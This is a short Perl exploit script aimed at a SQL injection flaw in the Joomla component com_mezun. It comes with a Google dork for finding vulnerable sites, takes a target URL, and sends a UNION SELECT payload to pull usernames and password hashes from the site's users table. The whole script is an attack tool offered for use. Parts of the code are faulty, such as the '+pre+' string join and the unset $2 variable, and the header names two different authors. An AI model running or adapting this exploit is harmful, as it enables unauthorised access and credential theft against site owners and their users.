#!/usr/bin/perl 
#Exploit title: Joomla Component com_mezun  SQL Injection exploit 
#Google Dork: inurl:index.php?option=com_mezun
#Exploit Author: CoderSec.

system("color a");


                                                               

print "*********************************************\n";
print "* Joomla Component com_mezun                *\n";
print "*      SQL Injection                        *\n";
print "*      Coded by AnonGhost.                  *\n";
print "*********************************************\n";
sleep 1;
use LWP::UserAgent;
print "Enter the target --> ";
chomp(my $target=<STDIN>);
$code="/**/union/**/select/**/concat(username,0x3a,password),username,password,0x3a,0x3a,0x3a,0x3a,0x3a,0x3a,0x3a,0x3a/**/from/**/"+pre+"_users/;";
$agent = LWP::UserAgent->new() or die "[!] Error while processing";
$agent->agent('Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.12011');
$host= $target. "/index.php?option=com_mezun&task=edit&hidemainmenu=joomla&id=-9999999==".$code;
$ok = $agent->request(HTTP::Request->new(GET=>$host));
$ok1 = $ok->content; if ($ok1 =~/([0-9a-fA-F]{32})/){
print "[+] Password found --> $1\n$2\n";

sleep 1;
}
else
{
print "Password not found \n";
}